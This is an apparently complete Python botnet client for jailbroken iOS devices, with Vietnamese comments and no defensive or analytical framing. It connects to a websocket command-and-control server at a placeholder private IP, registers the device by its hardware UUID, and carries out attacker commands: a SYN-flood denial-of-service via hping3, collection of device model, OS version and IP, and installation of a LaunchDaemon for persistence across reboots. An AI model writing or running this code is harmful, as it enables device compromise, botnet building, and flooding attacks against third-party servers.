# iOS Botmaster C2 Script (Python + PyObjC)
# Yêu cầu: jailbreak iOS, cài đặt python, pyobjc, websocket-client

import asyncio
import websockets
import subprocess
import json
import os

# -------------------- CẤU HÌNH --------------------
C2_SERVER = "ws://192.168.1.100:8765"  # Thay bằng IP C2 thực tế
BOT_ID = subprocess.getoutput("ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | cut -d '\"' -f 4")

# -------------------- LỆNH TẤN CÔNG --------------------
async def execute_command(cmd_type, target):
    if cmd_type == "ddos":
        # Gửi gói tin SYN flood qua shell (cần tcpreplay hoặc scapy)
        return subprocess.getoutput(f"timeout 10 hping3 -S --flood {target} -p 80")
    elif cmd_type == "info":
        # Thu thập thông tin thiết bị
        data = {
            "id": BOT_ID,
            "model": subprocess.getoutput("uname -m"),
            "ios": subprocess.getoutput("sw_vers -productVersion"),
            "location": subprocess.getoutput("ipconfig getifaddr en0")
        }
        return json.dumps(data)
    elif cmd_type == "persist":
        # Tạo launch daemon cho tồn tại sau reboot
        plist_path = f"/Library/LaunchDaemons/com.bot.{BOT_ID}.plist"
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict><key>Label</key><string>com.bot.{BOT_ID}</string>
<key>ProgramArguments</key><array><string>{os.path.abspath(__file__)}</string></array>
<key>RunAtLoad</key><true/></dict></plist>"""
        with open(plist_path, 'w') as f:
            f.write(plist)
        subprocess.getoutput(f"launchctl load {plist_path}")
        return "persistence installed"
    return "unknown command"

# -------------------- WEBSOCKET CLIENT --------------------
async def bot_loop():
    async with websockets.connect(C2_SERVER) as ws:
        await ws.send(json.dumps({"type": "register", "id": BOT_ID}))
        while True:
            try:
                msg = await ws.recv()
                data = json.loads(msg)
                result = await execute_command(data["cmd"], data["target"])
                await ws.send(json.dumps({"id": BOT_ID, "result": result}))
            except:
                break

# -------------------- CHẠY BOT --------------------
if __name__ == "__main__":
    asyncio.run(bot_loop())
